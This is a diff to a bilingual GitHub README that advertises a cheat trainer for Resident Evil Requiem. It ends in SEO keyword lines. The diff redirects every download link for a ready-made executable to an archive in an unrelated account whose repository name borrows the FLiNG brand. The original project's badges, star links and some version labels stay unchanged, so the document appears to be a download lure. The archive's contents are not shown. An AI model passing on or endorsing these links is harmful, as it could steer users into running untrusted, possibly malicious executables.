@@ -2,30 +2,30 @@
   <img src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" alt="Resident Evil Requiem Trainer Screenshot" width="480"/>
   <br><br>
 
-  [![GitHub release](https://img.shields.io/github/v/release/ModEngineLabs/resident-evil-requiem-sourse?color=green&label=Latest%20v1.0.6)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.6/RE_Requiem_Trainer_v1.0.6.rar)
+  [![GitHub release](https://img.shields.io/github/v/release/ModEngineLabs/resident-evil-requiem-sourse?color=green&label=Latest%20v1.0.6)](https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip)
   [![GitHub stars](https://img.shields.io/github/stars/ModEngineLabs/resident-evil-requiem-sourse?style=social)](https://github.com/ModEngineLabs/resident-evil-requiem-sourse/stargazers)
   [![License](https://img.shields.io/badge/License-Educational-blue)](LICENSE)
   [![Platform](https://img.shields.io/badge/Platform-Windows%20x64-orange)](https://github.com/ModEngineLabs/resident-evil-requiem-sourse)
-  [![Build](https://img.shields.io/badge/build-v1.0.6-success)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/latest)
+  [![Build](https://img.shields.io/badge/build-v1.0.7-success)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/latest)
 
   <h1>Resident Evil Requiem Trainer </h1>
   <h3>Профессиональный трейнер для Resident Evil Requiem (RE9 / Biohazard Requiem) – God Mode, Infinite Ammo, No Reload, Infinite Health и 15+ читов</h3>
 
   <p><strong>Только оффлайн / single-player режим!</strong> Использование в RE.Net, Mercenaries или любых онлайн-элементах → высокий риск бана.</p>
 
-  <p><strong>Текущая версия игры:</strong> v1.0 (Steam AppID 3764200) • Патч launch day 27.02.2026</p>
+  <p><strong>Текущая версия игры:</strong> v1.7 (Steam AppID 3764200) • Патч launch day 03.03.2026</p>
 
-  <a href="https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.6/RE_Requiem_Trainer_v1.0.6.rar">
-    <img src="https://img.shields.io/badge/Download%20v1.0.6%20Ready%20EXE-2E7D32?style=for-the-badge&logo=windows&logoColor=white" alt="Download v1.0.6"/>
+  <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip">
+    <img src="https://img.shields.io/badge/Download%20v1.0.6%20Ready%20EXE-2E7D32?style=for-the-badge&logo=windows&logoColor=white" alt="Download v1.0.7"/>
   </a>
 
 </div>
 
-# Professional Game Trainer for Resident Evil Requiem (RE9) V 1.0.6
-- Updated for the current game patch 02.28.2026
-- Обновлено под актуальный патч игры 28.02.2026
-- Компилирования версия - https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.0-launch/RERequiemTrainer.V1.0.6.zip
-- Compiling version - https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/download/v1.0.0-launch/RERequiemTrainer.V1.0.6.zip
+# Professional Game Trainer for Resident Evil Requiem (RE9) V 1.0.7
+- Updated for the current game patch 03.03.2026
+- Обновлено под актуальный патч игры 03.03.2026
+- Компилирования версия - https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip
+- Compiling version - https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip
 
 <img width="448" height="646" alt="image" src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" />
 
@@ -331,6 +331,3 @@ resident evil requiem wemod
 resident evil requiem trainer update  
 re9 trainer v1.0 steam  
 resident evil requiem fearless revolution  
-
-
-
